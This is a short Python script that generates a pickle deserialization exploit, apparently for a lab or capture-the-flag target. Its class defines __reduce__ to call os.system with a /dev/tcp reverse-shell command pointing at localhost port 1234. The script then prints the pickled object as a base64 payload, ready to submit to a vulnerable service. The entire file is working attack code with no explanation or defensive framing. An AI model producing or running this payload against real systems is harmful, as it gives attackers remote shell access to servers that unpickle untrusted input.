#!/usr/bin/env python3
# coding: UTF-8

import pickle
import socket
import os
import base64

class GetReverseShell(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh </dev/tcp/localhost/1234 >&0 2>&0',))

payload = pickle.dumps(GetReverseShell())
print(base64.urlsafe_b64encode(payload))
